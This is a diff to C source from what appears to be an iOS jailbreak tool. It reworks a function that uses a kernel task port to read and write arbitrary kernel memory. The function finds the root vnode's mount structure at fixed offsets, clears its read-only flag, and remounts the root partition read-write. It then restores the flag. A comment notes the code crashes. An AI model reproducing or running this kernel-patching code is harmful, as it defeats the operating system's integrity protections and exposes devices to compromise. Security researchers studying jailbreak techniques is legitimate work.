@@ -49,29 +49,49 @@ int file_exist (char *filename)
 
 // remount root partition r/W
 int remount_rw(task_t tfp0, vm_address_t kbase) {
+	
+	// Need these so struct vnode is properly defined:
+	/* 0x00 */   LIST_HEAD(buflists, buf);
+	/* 0x10 */   typedef  void *kauth_action_t ;
+	/* 0x18 */   typedef  struct {
+		uint64_t    x[2];
+		/* 0x28 */   } lck_mtx_t;
+	#if 0   // Cut/paste struct vnode (bsd/sys/vnode_internal.h) here (omitted for brevity)
+	struct vnode {
+	/* 0x00 */  lck_mtx_t v_lock;
+	/* 0x28 */  TAILQ_ENTRY(vnode) v_freelist;
+	/* 0x38 */  TAILQ_ENTRY(vnode) v_mntvnodes;
+	/* 0x48 */  TAILQ_HEAD(, namecache) v_ncchildren; /* name cache entries that regard us as their pare
+	/* 0x58 */  LIST_HEAD(, namecache) v_nclinks;     /* name cache entries that name this vnode */
+	....
+	/* 0xd8 */  mount_t v_mount;                      /* ptr to vfs we are in */
+	};
+	// mount_t (struct mount *) can similarly be obtained from bsd/sys/mount_internal.h
+	//  The specific mount flags are a uint32_t at offset 0x70
+	#endif
 
 	// prepare kernel r/w
 	prepare_rwk_via_tfp0(tfp0);
+	
+	//read rootfs_vnode from memory
 	uint64_t rootfs_vnode = ReadAnywhere64(OFFSET_ROOT_MOUNT_V_NODE - OFFSET_TEXT_HEADER + kbase);
 	
-	struct utsname uts;
-	uname(&uts);
+	vm_offset_t vmount_offset = 0xd0; //
+	vm_offset_t vflag_offset = 0x71; //
 	
-	vm_offset_t off = 0xd8;
-	if (strstr(uts.version, "16.0.0")) {
-		off = 0xd0;
-	}
-	uint64_t v_mount = ReadAnywhere64(rootfs_vnode+off);
-	uint32_t v_flag = ReadAnywhere32(v_mount + 0x71);
-	WriteAnywhere32(v_mount + 0x71, v_flag & (~(0x1<<6)));
+	uint64_t v_mount = ReadAnywhere64(rootfs_vnode + vmount_offset);
+	uint32_t v_flag = ReadAnywhere32(v_mount + vflag_offset);
+	
+	WriteAnywhere32(v_mount + vflag_offset, v_flag & ~(1 << 6));
 	
 	char* nmz = strdup("/dev/disk0s1s1");
-	int lolr = mount( "hfs", "/", MNT_UPDATE, (void*)&nmz);
-	NSLog(@"remounting: %d", lolr);
+	int rv = mount( "hfs", "/", MNT_UPDATE, (void*)&nmz);
+	printf("RC: %d (flags: 0x%x) %s \n", rv, v_flag, strerror(errno));
+	//NSLog(@"remounting: %d", rv);
 	
-	v_mount = ReadAnywhere64(rootfs_vnode+off);
+	v_mount = ReadAnywhere64(rootfs_vnode + vmount_offset);
 	
-	WriteAnywhere32(v_mount + 0x71, v_flag);
+	WriteAnywhere32(v_mount + vflag_offset, v_flag);
 	
 	int fd = open("/.bit_of_fun", O_RDONLY);
 	if (fd == -1) {
@@ -100,7 +120,7 @@ static int party_hard(void)
 			printf("kernel base:  0x%lx\n",kbase);
 			remount_rw(kernel_task, kbase); //do not work, crashed, just commit now
 
-			ret = 0;
+			ret = 1;
 	 }
 	return ret;
 }
